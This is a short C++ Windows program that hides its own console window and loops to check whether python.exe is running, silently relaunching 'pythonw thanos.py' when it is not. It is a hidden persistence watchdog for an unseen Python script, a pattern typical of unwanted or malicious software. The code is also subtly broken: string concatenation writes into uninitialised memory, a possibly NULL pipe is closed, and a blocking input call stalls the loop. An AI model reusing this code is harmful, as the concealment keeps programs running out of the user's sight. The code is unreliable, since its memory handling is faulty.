#include <stdio.h>
#include <stdlib.h>
#include<iostream>
#include <string.h>
#include <windows.h>
using namespace std;

void Stealth()
{
 HWND Stealth;
 AllocConsole();
 Stealth = FindWindowA("ConsoleWindowClass", NULL);
 ShowWindow(Stealth,0);
}



char* concatenate(char * dest, char * source) {
    char * out = (char *)malloc(strlen(source) + strlen(dest) + 1);

    if (out != NULL) {
            strcat(out, dest);
            strcat(out, source);
    }

    return out;
}

char * executeCmd(char * cmd) {
    FILE *fp;

    int BUFF_SIZE = 1024;

    int size_line;
    char line[BUFF_SIZE];

    char* results = (char*) malloc(BUFF_SIZE * sizeof(char));

    if (cmd != NULL) {
            /* Open the command for reading. */
            fp = popen(cmd, "r");
            if (fp != NULL) {

            /* Read the output a line at a time - output it. */
            while (fgets(line, size_line = sizeof(line), fp) != NULL) {
                    results = concatenate(results, line);
            }
            }
            /* close */
            pclose(fp);
    } // END if cmd ! null

    return results;
}


int main( int argc, char *argv[] )
{
    Stealth();
    while (1)
    {

    char * out = executeCmd("tasklist | find \"python.exe\" ");
    int info=strlen(out);
    if (info > 3)
    {
        cout<<"python is opened"<<endl;
    }
    else
    {
        cout<<"python is closed"<<endl;
        popen("pythonw thanos.py","r");

    }
    int k;
    cin>>k;

    }

    return 0;
}
